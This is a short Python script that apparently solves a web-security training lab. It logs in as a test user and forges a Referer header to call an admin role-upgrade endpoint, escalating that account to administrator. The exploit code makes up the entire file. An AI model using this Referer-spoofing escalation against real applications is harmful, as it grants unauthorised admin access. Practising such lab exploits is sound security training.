import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def upgrade_role(s, url, path):
    target_url = url + path
    headers = { 'Referer': (url[:-1] if url[-1] == '/' else url) + '/admin' }
    r = s.get(target_url, headers=headers)

    if 'Admin panel' in r.text and r.status_code == 200:
        print(f'[+] Successful upgrade user role to admin')
    else:
        print('[-] Fail to upgrade user role')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
    print('[-] Fail to exploit lab')

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    login_acc(s, url, 'wiener', 'peter')
    upgrade_role(s, url, '/admin-roles?username=wiener&action=upgrade')
    check_solved_lab(s, url)
    

if __name__ == '__main__':
    main()